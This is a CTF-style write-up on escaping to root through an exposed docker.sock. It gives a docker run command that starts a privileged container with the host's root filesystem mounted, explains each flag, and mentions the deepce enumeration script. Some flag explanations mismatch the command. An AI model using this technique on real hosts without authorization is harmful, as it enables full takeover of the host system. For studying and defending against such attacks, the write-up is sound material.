If an attacker gains access to the docker.sock file, __they can use it to issue commands to the Docker daemon with the same level of privileges as the user who owns the docker.sock file, which is typically the **root user**__. This means that an attacker could potentially take control of the Docker daemon, run malicious containers, delete or modify existing containers, images, and volumes, and even access sensitive information stored within the containers.

Furthermore, exposing the docker.sock file can also enable container escape attacks, where an attacker can use a compromised container to break out of its isolation and gain access to the host system. This is because the docker.sock file provides a direct communication channel between the Docker daemon and the container, allowing an attacker to potentially manipulate the host system from within the container.
#### Steps to priv Esc to root.
First of all, import the docker binary.
- Check for the current running docker containers and look at the present docker images because we need to create a new docker container.
![Screenshot from 2023-03-24 00-36-34](https://user-images.githubusercontent.com/99975622/228672953-60c109d8-1286-4871-81ec-f90dd6814168.png)

We can then run the following command.
```
./docker -H unix:///app/docker.sock run --name m3tr1c -it --priviledged -v /:/mnt/ -d --rm laravel-app_main
```
- --name tester: Sets the name of the container to tester.
- -it: Allocates a pseudo-TTY and connects the container to the current terminal session.
- --privileged: Runs the container in privileged mode, which gives it access to all host devices and allows it to perform actions that are normally restricted for security reasons.
- -v /:/mnt/: Mounts the host's root directory (/) to the container's /mnt directory, which allows the container to access files and directories on the host system.
- -d: Detaches the container from the current terminal session and runs it in the background.
- --rm: Automatically removes the container and its associated files when it is stopped or exits.


Overall, this command creates a new container named "m3tr1c" based on the "laravel-app_main" image, runs it in detached mode with a terminal attached to it, and gives it privileged access to all devices on the host system. It also mounts the root directory of the host system as a volume inside the container at "/mnt/", allowing the container to access the host system's files and directories. Finally, the container is automatically removed when it is stopped or exits.

- The ps command checks the running docker containers and we can see our very own created container.
![Screenshot from 2023-03-24 00-48-40](https://user-images.githubusercontent.com/99975622/228672318-fa6aebbd-1c07-49e0-af13-c8cacbdbf58f.png)

We can then enter into our docker container and we are root on our new container.
![Screenshot from 2023-03-24 00-49-38](https://user-images.githubusercontent.com/99975622/228675033-4c148963-3af6-4c00-81c3-f511cea875a9.png)
With that, we can now move into the /mnt/ directory and we will find the host file system mounted;we can now get our root flag.
![Screenshot from 2023-03-24 00-49-59](https://user-images.githubusercontent.com/99975622/228675366-eddf0ff0-cd2b-4f34-82bd-7eef60e74dc3.png)
And Done!

#### Docker enumeration using deepce
Deepce .sh  is a bash script similar to linpeas and winpeas for further enumeration and priviledge escalation of docker containers.
![Screenshot from 2023-03-23 23-27-39](https://user-images.githubusercontent.com/99975622/228676134-a535c9aa-1b0b-4ebd-a723-644986a7aa9e.png)

If we run it on the docker container, we can see that we see that it tells us that the docker sock is mounted and also gives us a link for its exploitation.

![Screenshot from 2023-03-23 23-29-19](https://user-images.githubusercontent.com/99975622/228676201-68735630-fd0d-4472-94ba-ee8843631b3a.png)
The link...
![Screenshot from 2023-03-23 23-29-42](https://user-images.githubusercontent.com/99975622/228676308-807a216c-6221-47a7-b454-13e1a25b2121.png)

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_r00t
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
